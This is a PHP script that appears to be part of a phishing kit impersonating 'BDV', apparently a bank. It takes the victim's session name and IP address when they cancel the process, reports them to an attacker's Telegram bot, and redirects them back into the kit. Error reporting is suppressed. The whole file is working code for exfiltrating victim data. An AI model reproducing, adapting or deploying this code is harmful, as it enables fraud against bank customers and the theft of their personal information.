<?php
// cancelacion.php
error_reporting(0);
// Se reemplaza discord_config.php por la info de Telegram
require 'tgbroo.php'; 

// 2. OBTENER DATOS DEL USUARIO
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
$nombre = isset($_SESSION['nombre']) ? $_SESSION['nombre'] : 'Desconocido'; 

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

/**
 * Función para enviar notificaciones a Telegram
 */
function sendToTelegram($mensaje) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ],
    ];
    $context  = stream_context_create($options);
    return file_get_contents($url, false, $context);
}

// 3. CONSTRUCCIÓN DEL MENSAJE Y ENVÍO A TELEGRAM
// Formateamos la notificación de cancelación
$msg = "<b>🛑 BDV - CANCELACIÓN DETECTADA</b>\n";
$msg .= "━━━━━━━━━━━━━━━━━━\n";
$msg .= "<b>Acción:</b> El usuario canceló el proceso. 🚫🔒\n\n";
$msg .= "<b>Usuario:</b> {$nombre}\n";
$msg .= "<b>━━━━━━━━━━━━━━━━━━</b>\n";
$msg .= "<b>🌐 IP:</b> <code>{$ip}</code>\n";

// Enviar a Telegram
sendToTelegram($msg);

// 4. REDIRIGIR AL SIGUIENTE PASO
header('Location: index.php'); 
exit();
?>